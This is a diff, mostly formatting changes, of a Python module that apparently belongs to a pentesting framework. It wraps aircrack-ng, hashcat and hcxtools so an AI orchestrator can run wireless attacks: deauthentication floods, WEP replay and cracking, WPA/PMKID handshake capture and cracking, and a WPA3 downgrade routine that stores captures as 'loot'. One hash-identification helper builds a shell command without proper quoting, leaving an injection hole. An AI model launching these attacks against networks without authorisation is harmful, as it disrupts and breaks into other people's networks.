@@ -5,12 +5,14 @@ Structured Python interfaces around common pentesting CLIs.
 Each wrapper executes via NativeLayer and parses raw output into
 dictionaries suitable for the AI orchestrator or the GUI.
 """
+
 import json
 import re
 import shlex
 import xml.etree.ElementTree as ET
 from typing import Optional
 from james.layers.native import NativeLayer, CommandResult
+
 
 class AircrackSuite:
     """Wrappers around airmon-ng, airodump-ng, aireplay-ng, aircrack-ng."""
@@ -20,57 +22,72 @@ class AircrackSuite:
 
     def list_interfaces(self) -> list[dict]:
         """List wireless interfaces and their current mode."""
-        result = self.layer.run('iwconfig 2>/dev/null', timeout=10)
+        result = self.layer.run("iwconfig 2>/dev/null", timeout=10)
         interfaces = []
         current = {}
         for line in result.stdout.splitlines():
-            if 'no wireless extensions' in line:
+            if "no wireless extensions" in line:
                 if current:
                     interfaces.append(current)
                     current = {}
                 continue
-            if line and (not line.startswith(' ')) and (not line.startswith('\t')):
+            if (
+                line
+                and (not line.startswith(" "))
+                and (not line.startswith("\t"))
+            ):
                 if current:
                     interfaces.append(current)
                 iface = line.split()[0]
-                mode = 'unknown'
-                if 'Mode:' in line:
-                    mode = line.split('Mode:')[1].split()[0]
-                current = {'interface': iface, 'mode': mode}
-            elif current and 'Mode:' in line:
-                current['mode'] = line.split('Mode:')[1].split()[0]
+                mode = "unknown"
+                if "Mode:" in line:
+                    mode = line.split("Mode:")[1].split()[0]
+                current = {"interface": iface, "mode": mode}
+            elif current and "Mode:" in line:
+                current["mode"] = line.split("Mode:")[1].split()[0]
         if current:
             interfaces.append(current)
         return interfaces
 
     def enable_monitor(self, interface: str) -> CommandResult:
         """Put an interface into monitor mode via airmon-ng."""
-        return self.layer.run(f'airmon-ng start {interface}', sudo=True, timeout=30)
+        return self.layer.run(
+            f"airmon-ng start {interface}", sudo=True, timeout=30
+        )
 
     def disable_monitor(self, interface: str) -> CommandResult:
         """Restore managed mode via airmon-ng."""
-        return self.layer.run(f'airmon-ng stop {interface}', sudo=True, timeout=30)
+        return self.layer.run(
+            f"airmon-ng stop {interface}", sudo=True, timeout=30
+        )
 
     def check_kill(self) -> CommandResult:
         """Kill processes that might interfere with monitor mode."""
-        return self.layer.run('airmon-ng check kill', sudo=True, timeout=15)
+        return self.layer.run("airmon-ng check kill", sudo=True, timeout=15)
 
-    def start_airodump(self, interface: str, *, channel: Optional[int]=None, bssid: Optional[str]=None, write_prefix: Optional[str]=None):
+    def start_airodump(
+        self,
+        interface: str,
+        *,
+        channel: Optional[int] = None,
+        bssid: Optional[str] = None,
+        write_prefix: Optional[str] = None,
+    ):
         """
         Start airodump-ng in the background. Returns the Popen handle.
 
         The caller should use NativeLayer.kill_background(proc) to stop it.
         """
-        parts = ['airodump-ng']
+        parts = ["airodump-ng"]
         if channel:
-            parts.append(f'--channel {channel}')
+            parts.append(f"--channel {channel}")
         if bssid:
-            parts.append(f'--bssid {bssid}')
+            parts.append(f"--bssid {bssid}")
         if write_prefix:
-            parts.append(f'-w {write_prefix}')
-            parts.append('--output-format pcap,csv')
+            parts.append(f"-w {write_prefix}")
+            parts.append("--output-format pcap,csv")
         parts.append(interface)
-        return self.layer.run_background(' '.join(parts), sudo=True)
+        return self.layer.run_background(" ".join(parts), sudo=True)
 
     @staticmethod
     def parse_airodump_csv(csv_content: str) -> dict:
@@ -79,17 +96,23 @@ class AircrackSuite:
         Accepts either raw CSV text or a file path string.
         """
         import logging
+
         logger = logging.getLogger(__name__)
 
         # If csv_content looks like a file path, read it
         import os
+
         if os.path.isfile(csv_content):
             try:
-                with open(csv_content, 'r', encoding='utf-8', errors='ignore') as f:
+                with open(
+                    csv_content, "r", encoding="utf-8", errors="ignore"
+                ) as f:
                     csv_content = f.read()
             except Exception as e:
-                logger.warning("Could not read CSV file %s: %s", csv_content, e)
-                return {'aps': [], 'stations': []}
+                logger.warning(
+                    "Could not read CSV file %s: %s", csv_content, e
+                )
+                return {"aps": [], "stations": []}
 
         aps = []
         stations = []
@@ -98,21 +121,29 @@ class AircrackSuite:
             line = line.strip()
             if not line:
                 continue
-            if line.startswith('BSSID,'):
+            if line.startswith("BSSID,"):
                 section = 1
                 continue
-            elif line.startswith('Station MAC,'):
+            elif line.startswith("Station MAC,"):
                 section = 3
                 continue
             try:
-                parts = [p.strip() for p in line.split(',')]
+                parts = [p.strip() for p in line.split(",")]
                 if section == 1 and len(parts) >= 14:
                     bssid = parts[0]
                     try:
                         power = int(parts[8])
                     except ValueError:
                         power = -100
-                    aps.append({'bssid': bssid, 'channel': parts[3], 'privacy': parts[5], 'power': power, 'essid': parts[13] if len(parts) > 13 else ''})
+                    aps.append(
+                        {
+                            "bssid": bssid,
+                            "channel": parts[3],
+                            "privacy": parts[5],
+                            "power": power,
+                            "essid": parts[13] if len(parts) > 13 else "",
+                        }
+                    )
                 elif section == 3 and len(parts) >= 6:
                     station_mac = parts[0]
                     connected_bssid = parts[5]
@@ -121,90 +152,154 @@ class AircrackSuite:
                     except (ValueError, IndexError):
                         cli_power = -100
                     # Probed SSIDs are in column 6+
-                    probes = ','.join(p.strip() for p in parts[6:] if p.strip()) if len(parts) > 6 else ''
-                    stations.append({
-                        'station_mac': station_mac,
-                        'bssid': connected_bssid if connected_bssid != '(not associated)' else '',
-                        'power': cli_power,
-                        'probes': probes,
-                    })
+                    probes = (
+                        ",".join(p.strip() for p in parts[6:] if p.strip())
+                        if len(parts) > 6
+                        else ""
+                    )
+                    stations.append(
+                        {
+                            "station_mac": station_mac,
+                            "bssid": (
+                                connected_bssid
+                                if connected_bssid != "(not associated)"
+                                else ""
+                            ),
+                            "power": cli_power,
+                            "probes": probes,
+                        }
+                    )
             except Exception as e:
-                logger.debug("Failed to parse airodump CSV line: '%s'. Error: %s", line, e)
-        return {'aps': aps, 'stations': stations}
+                logger.debug(
+                    "Failed to parse airodump CSV line: '%s'. Error: %s",
+                    line,
+                    e,
+                )
+        return {"aps": aps, "stations": stations}
 
-    def deauth(self, interface: str, bssid: str, *, count: int=10, client: Optional[str]=None) -> CommandResult:
+    def deauth(
+        self,
+        interface: str,
+        bssid: str,
+        *,
+        count: int = 10,
+        client: Optional[str] = None,
+    ) -> CommandResult:
         """Send deauthentication frames."""
-        client_arg = f'-c {shlex.quote(client)}' if client else ''
-        cmd = f'aireplay-ng -0 {count} -a {shlex.quote(bssid)} {client_arg} -D {shlex.quote(interface)}'
+        client_arg = f"-c {shlex.quote(client)}" if client else ""
+        cmd = f"aireplay-ng -0 {count} -a {shlex.quote(bssid)} {client_arg} -D {shlex.quote(interface)}"
         return self.layer.run(cmd, sudo=True, timeout=60)
 
-    def crack_wpa(self, capture_file: str, wordlist: str, *, bssid: Optional[str]=None) -> dict:
+    def crack_wpa(
+        self, capture_file: str, wordlist: str, *, bssid: Optional[str] = None
+    ) -> dict:
         """
         Run aircrack-ng against a capture file.
         Returns dict with 'found', 'key', and raw output.
         """
-        bssid_arg = f'-b {shlex.quote(bssid)}' if bssid else ''
-        cmd = f'aircrack-ng {bssid_arg} -w {shlex.quote(wordlist)} {shlex.quote(capture_file)}'
+        bssid_arg = f"-b {shlex.quote(bssid)}" if bssid else ""
+        cmd = f"aircrack-ng {bssid_arg} -w {shlex.quote(wordlist)} {shlex.quote(capture_file)}"
         result = self.layer.run(cmd, timeout=600)
         found = False
-        key = ''
+        key = ""
         for line in result.stdout.splitlines():
-            if 'KEY FOUND!' in line:
+            if "KEY FOUND!" in line:
                 found = True
-                match = re.search('\\[\\s*(.+?)\\s*\\]', line)
+                match = re.search("\\[\\s*(.+?)\\s*\\]", line)
                 if match:
                     key = match.group(1)
                 break
-        return {'command': cmd, 'found': found, 'key': key, 'returncode': result.returncode, 'output': result.stdout[-2000:]}
+        return {
+            "command": cmd,
+            "found": found,
+            "key": key,
+            "returncode": result.returncode,
+            "output": result.stdout[-2000:],
+        }
 
     def check_handshake(self, capture_file: str, bssid: str) -> bool:
         """Check if a valid handshake exists in the capture file."""
-        cmd = f'aircrack-ng -b {shlex.quote(bssid)} {shlex.quote(capture_file)}'
+        cmd = (
+            f"aircrack-ng -b {shlex.quote(bssid)} {shlex.quote(capture_file)}"
+        )
         result = self.layer.run(cmd, timeout=10)
-        return '1 handshake' in result.stdout or 'WPA (1 handshake)' in result.stdout
+        return (
+            "1 handshake" in result.stdout
+            or "WPA (1 handshake)" in result.stdout
+        )
 
-    def fake_auth(self, interface: str, bssid: str, *, delay: int=0) -> CommandResult:
+    def fake_auth(
+        self, interface: str, bssid: str, *, delay: int = 0
+    ) -> CommandResult:
         """Perform fake authentication against a WEP AP."""
         cmd = f"aireplay-ng -1 {delay} -e '' -a {shlex.quote(bssid)} -h $(macchanger -s {shlex.quote(interface)} | grep -oP '[0-9a-f:]+' | head -1) {shlex.quote(interface)}"
         return self.layer.run(cmd, sudo=True, timeout=30)
 
-    def arp_replay(self, interface: str, bssid: str, *, timeout: int=300) -> CommandResult:
+    def arp_replay(
+        self, interface: str, bssid: str, *, timeout: int = 300
+    ) -> CommandResult:
         """ARP request replay attack to generate IVs for WEP cracking."""
-        cmd = f'aireplay-ng -3 -b {shlex.quote(bssid)} {shlex.quote(interface)}'
+        cmd = (
+            f"aireplay-ng -3 -b {shlex.quote(bssid)} {shlex.quote(interface)}"
+        )
         return self.layer.run(cmd, sudo=True, timeout=timeout)
 
-    def chopchop(self, interface: str, bssid: str, *, timeout: int=300) -> dict:
+    def chopchop(
+        self, interface: str, bssid: str, *, timeout: int = 300
+    ) -> dict:
         """KoreK chopchop attack — decrypt a WEP packet without the key."""
-        cmd = f'aireplay-ng -4 -b {shlex.quote(bssid)} {shlex.quote(interface)} -F'
+        cmd = f"aireplay-ng -4 -b {shlex.quote(bssid)} {shlex.quote(interface)} -F"
         result = self.layer.run(cmd, sudo=True, timeout=timeout)
-        return {'command': cmd, 'success': 'Use packetforge-ng' in result.stdout or result.returncode == 0, 'output': result.stdout[-2000:]}
+        return {
+            "command": cmd,
+            "success": "Use packetforge-ng" in result.stdout
+            or result.returncode == 0,
+            "output": result.stdout[-2000:],
+        }
 
-    def fragment_attack(self, interface: str, bssid: str, *, timeout: int=300) -> dict:
+    def fragment_attack(
+        self, interface: str, bssid: str, *, timeout: int = 300
+    ) -> dict:
         """Fragmentation attack — obtain a PRGA keystream from WEP."""
-        cmd = f'aireplay-ng -5 -b {shlex.quote(bssid)} {shlex.quote(interface)} -F'
+        cmd = f"aireplay-ng -5 -b {shlex.quote(bssid)} {shlex.quote(interface)} -F"
         result = self.layer.run(cmd, sudo=True, timeout=timeout)
-        return {'command': cmd, 'success': 'Use packetforge-ng' in result.stdout or result.returncode == 0, 'output': result.stdout[-2000:]}
+        return {
+            "command": cmd,
+            "success": "Use packetforge-ng" in result.stdout
+            or result.returncode == 0,
+            "output": result.stdout[-2000:],
+        }
 
-    def crack_wep(self, capture_file: str, *, bssid: Optional[str]=None) -> dict:
+    def crack_wep(
+        self, capture_file: str, *, bssid: Optional[str] = None
+    ) -> dict:
         """Crack WEP key from captured IVs."""
-        bssid_arg = f'-b {shlex.quote(bssid)}' if bssid else ''
-        cmd = f'aircrack-ng {bssid_arg} {shlex.quote(capture_file)}'
+        bssid_arg = f"-b {shlex.quote(bssid)}" if bssid else ""
+        cmd = f"aircrack-ng {bssid_arg} {shlex.quote(capture_file)}"
         result = self.layer.run(cmd, timeout=300)
         found = False
-        key = ''
+        key = ""
         for line in result.stdout.splitlines():
-            if 'KEY FOUND!' in line:
+            if "KEY FOUND!" in line:
                 found = True
-                match = re.search('\\[\\s*(.+?)\\s*\\]', line)
+                match = re.search("\\[\\s*(.+?)\\s*\\]", line)
                 if match:
                     key = match.group(1)
                 break
-        return {'command': cmd, 'found': found, 'key': key, 'output': result.stdout[-2000:]}
+        return {
+            "command": cmd,
+            "found": found,
+            "key": key,
+            "output": result.stdout[-2000:],
+        }
 
-    def interactive_replay(self, interface: str, bssid: str, *, timeout: int=120) -> CommandResult:
+    def interactive_replay(
+        self, interface: str, bssid: str, *, timeout: int = 120
+    ) -> CommandResult:
         """Interactive packet selection replay (aireplay-ng -2)."""
-        cmd = f'aireplay-ng -2 -b {shlex.quote(bssid)} -F {shlex.quote(interface)}'
+        cmd = f"aireplay-ng -2 -b {shlex.quote(bssid)} -F {shlex.quote(interface)}"
         return self.layer.run(cmd, sudo=True, timeout=timeout)
+
 
 class Hashcat:
     """Wrapper around hashcat."""
@@ -212,17 +307,31 @@ class Hashcat:
     def __init__(self, layer: NativeLayer):
         self.layer = layer
 
-    def crack(self, hash_file: str, wordlist: str, *, hash_mode: int=0, rules: Optional[str]=None, timeout: int=600) -> dict:
-        rules_arg = f'-r {shlex.quote(rules)}' if rules else ''
-        cmd = f'hashcat -m {int(hash_mode)} {rules_arg} {shlex.quote(hash_file)} {shlex.quote(wordlist)} --force'
+    def crack(
+        self,
+        hash_file: str,
+        wordlist: str,
+        *,
+        hash_mode: int = 0,
+        rules: Optional[str] = None,
+        timeout: int = 600,
+    ) -> dict:
+        rules_arg = f"-r {shlex.quote(rules)}" if rules else ""
+        cmd = f"hashcat -m {int(hash_mode)} {rules_arg} {shlex.quote(hash_file)} {shlex.quote(wordlist)} --force"
         result = self.layer.run(cmd, timeout=timeout)
-        return {'command': cmd, 'success': result.success, 'output': result.stdout[-3000:], 'stderr': result.stderr[-1000:]}
+        return {
+            "command": cmd,
+            "success": result.success,
+            "output": result.stdout[-3000:],
+            "stderr": result.stderr[-1000:],
+        }
 
     def identify_hash(self, hash_value: str) -> dict:
         """Use hashcat's built-in hash identification (--identify)."""
-        cmd = f'echo {hash_value!r} | hashcat --identify'
+        cmd = f"echo {hash_value!r} | hashcat --identify"
         result = self.layer.run(cmd, timeout=30)
-        return {'output': result.stdout, 'stderr': result.stderr}
+        return {"output": result.stdout, "stderr": result.stderr}
+
 
 class Hcxtools:
     """Wrapper around hcxdumptool and hcxpcapngtool for clientless PMKID attacks."""
@@ -230,28 +339,41 @@ class Hcxtools:
     def __init__(self, layer: NativeLayer):
         self.layer = layer
 
-    def capture_pmkid(self, interface: str, output_pcapng: str, *, timeout: int=600) -> dict:
+    def capture_pmkid(
+        self, interface: str, output_pcapng: str, *, timeout: int = 600
+    ) -> dict:
         """Run hcxdumptool to capture PMKID hashes from nearby APs."""
-        cmd = f'timeout {int(timeout)} hcxdumptool -i {shlex.quote(interface)} -o {shlex.quote(output_pcapng)} --enable_status=15'
+        cmd = f"timeout {int(timeout)} hcxdumptool -i {shlex.quote(interface)} -o {shlex.quote(output_pcapng)} --enable_status=15"
         result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
-        return {'command': cmd, 'output': result.stdout[-2000:], 'stderr': result.stderr[-2000:]}
+        return {
+            "command": cmd,
+            "output": result.stdout[-2000:],
+            "stderr": result.stderr[-2000:],
+        }
 
     def extract_hashes(self, pcapng_file: str, output_hash_file: str) -> dict:
         """Extract crackable hashes (hc22000 format) from a pcapng using hcxpcapngtool."""
-        cmd = f'hcxpcapngtool -o {shlex.quote(output_hash_file)} {shlex.quote(pcapng_file)}'
+        cmd = f"hcxpcapngtool -o {shlex.quote(output_hash_file)} {shlex.quote(pcapng_file)}"
         result = self.layer.run(cmd, timeout=30)
         pmkid_count = 0
         eapol_count = 0
         for line in result.stdout.splitlines():
-            if 'PMKID(s) written' in line:
-                match = re.search('(\\d+)\\s+PMKID', line)
+            if "PMKID(s) written" in line:
+                match = re.search("(\\d+)\\s+PMKID", line)
                 if match:
                     pmkid_count = int(match.group(1))
-            if 'EAPOL message pairs written' in line or 'EAPOL M1/M2' in line:
-                match = re.search('(\\d+)\\s+EAPOL', line)
+            if "EAPOL message pairs written" in line or "EAPOL M1/M2" in line:
+                match = re.search("(\\d+)\\s+EAPOL", line)
                 if match:
                     eapol_count = int(match.group(1))
-        return {'command': cmd, 'success': pmkid_count > 0 or eapol_count > 0, 'pmkid_count': pmkid_count, 'eapol_count': eapol_count, 'output': result.stdout}
+        return {
+            "command": cmd,
+            "success": pmkid_count > 0 or eapol_count > 0,
+            "pmkid_count": pmkid_count,
+            "eapol_count": eapol_count,
+            "output": result.stdout,
+        }
+
 
 class WPA3Tools:
     """Wrapper for WPA3 / SAE tools and attacks."""
@@ -259,7 +381,9 @@ class WPA3Tools:
     def __init__(self, layer: NativeLayer):
         self.layer = layer
 
-    def check_sae_support(self, interface: str, bssid: str, timeout: int = 15) -> dict:
+    def check_sae_support(
+        self, interface: str, bssid: str, timeout: int = 15
+    ) -> dict:
         """
         Check if an AP supports WPA3 (SAE) or OWE, and detect transition mode.
         Runs a quick airodump-ng scan and parses the output.
@@ -270,24 +394,26 @@ class WPA3Tools:
         result_dict = {
             "supports_sae": False,
             "supports_owe": False,
-            "transition_mode": False
+            "transition_mode": False,
         }
 
         with tempfile.TemporaryDirectory() as tempdir:
             out_prefix = os.path.join(tempdir, "wpa3check")
-            cmd = f'airodump-ng {shlex.quote(interface)} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format csv'
-            self.layer.run(f'timeout {timeout} {cmd}', sudo=True)
+            cmd = f"airodump-ng {shlex.quote(interface)} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format csv"
+            self.layer.run(f"timeout {timeout} {cmd}", sudo=True)
 
             csv_file = f"{out_prefix}-01.csv"
             if os.path.exists(csv_file):
                 try:
-                    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    with open(
+                        csv_file, "r", encoding="utf-8", errors="ignore"
+                    ) as f:
                         lines = f.readlines()
 
                         # Find the BSSID line
                         for line in lines:
                             if line.startswith(bssid.upper()):
-                                parts = [p.strip() for p in line.split(',')]
+                                parts = [p.strip() for p in line.split(",")]
                                 if len(parts) > 7:
                                     auth = parts[7].upper()
                                     cipher = parts[6].upper()
@@ -299,7 +425,17 @@ class WPA3Tools:
                                         result_dict["supports_owe"] = True
 
                                     # Transition mode typically shows WPA2/WPA3 mixed or PSK+SAE
-                                    if ("PSK" in auth and "SAE" in auth) or ("WPA2" in cipher and "WPA3" in cipher) or (result_dict["supports_sae"] and "PSK" in auth):
+                                    if (
+                                        ("PSK" in auth and "SAE" in auth)
+                                        or (
+                                            "WPA2" in cipher
+                                            and "WPA3" in cipher
+                                        )
+                                        or (
+                                            result_dict["supports_sae"]
+                                            and "PSK" in auth
+                                        )
+                                    ):
                                         result_dict["transition_mode"] = True
                                         result_dict["supports_sae"] = True
                                 break
@@ -308,7 +444,13 @@ class WPA3Tools:
 
         return result_dict
 
-    def downgrade_attack(self, interface: str, bssid: str, channel: int = None, timeout: int = 30) -> dict:
+    def downgrade_attack(
+        self,
+        interface: str,
+        bssid: str,
+        channel: int = None,
+        timeout: int = 30,
+    ) -> dict:
         """
         Perform a WPA3 transition mode downgrade attack (Dragonblood style).
         Sends deauth frames forcing WPA2 fallback, while listening for a WPA2 handshake.
@@ -318,21 +460,19 @@ class WPA3Tools:
         import time
         import glob
 
-        result_dict = {
-            "success": False,
-            "log": [],
-            "capture_file": None
-        }
+        result_dict = {"success": False, "log": [], "capture_file": None}
 
         if not channel:
-            result_dict["log"].append("Error: Channel is required for downgrade attack.")
+            result_dict["log"].append(
+                "Error: Channel is required for downgrade attack."
+            )
             return result_dict
 
         with tempfile.TemporaryDirectory() as tempdir:
             out_prefix = os.path.join(tempdir, "downgrade")
 
             # Start airodump-ng in the background to capture handshakes
-            dump_cmd = f'airodump-ng {shlex.quote(interface)} -c {channel} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format pcap'
+            dump_cmd = f"airodump-ng {shlex.quote(interface)} -c {channel} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format pcap"
             dump_result = self.layer.run_background(dump_cmd, sudo=True)
             result_dict["log"].append(f"Started capture on ch {channel}...")
 
@@ -340,8 +480,10 @@ class WPA3Tools:
             time.sleep(2)
 
             # Send continuous deauths
-            result_dict["log"].append("Sending forced deauths to trigger WPA2 fallback...")
-            deauth_cmd = f'aireplay-ng -0 5 -a {shlex.quote(bssid)} {shlex.quote(interface)}'
+            result_dict["log"].append(
+                "Sending forced deauths to trigger WPA2 fallback..."
+            )
+            deauth_cmd = f"aireplay-ng -0 5 -a {shlex.quote(bssid)} {shlex.quote(interface)}"
             self.layer.run(deauth_cmd, sudo=True)
 
             time.sleep(timeout - 2)
@@ -351,24 +493,36 @@ class WPA3Tools:
             time.sleep(1)
 
             # Look for PCAP and check for handshakes (via aircrack-ng)
-            pcaps = glob.glob(f"{out_prefix}-*.cap") + glob.glob(f"{out_prefix}-*.pcap")
+            pcaps = glob.glob(f"{out_prefix}-*.cap") + glob.glob(
+                f"{out_prefix}-*.pcap"
+            )
             if pcaps:
                 pcap_file = pcaps[0]
-                check_cmd = f'aircrack-ng {shlex.quote(pcap_file)}'
+                check_cmd = f"aircrack-ng {shlex.quote(pcap_file)}"
                 check_result = self.layer.run(check_cmd)
-                if '1 handshake' in check_result.stdout or 'WPA (1 handshake)' in check_result.stdout:
+                if (
+                    "1 handshake" in check_result.stdout
+                    or "WPA (1 handshake)" in check_result.stdout
+                ):
                     result_dict["success"] = True
-                    result_dict["log"].append("Successfully forced downgrade and captured WPA2 handshake!")
+                    result_dict["log"].append(
+                        "Successfully forced downgrade and captured WPA2 handshake!"
+                    )
 
                     # Copy to a persistent location
                     import shutil
+
                     persist_dir = os.path.expanduser("~/.james/loot")
                     os.makedirs(persist_dir, exist_ok=True)
-                    dest_file = os.path.join(persist_dir, f"downgrade_{bssid.replace(':', '')}.pcap")
+                    dest_file = os.path.join(
+                        persist_dir, f"downgrade_{bssid.replace(':', '')}.pcap"
+                    )
                     shutil.copy2(pcap_file, dest_file)
                     result_dict["capture_file"] = dest_file
                 else:
-                    result_dict["log"].append("Deauths sent, but no WPA2 handshake captured.")
+                    result_dict["log"].append(
+                        "Deauths sent, but no WPA2 handshake captured."
+                    )
             else:
                 result_dict["log"].append("Error: No capture file generated.")
 
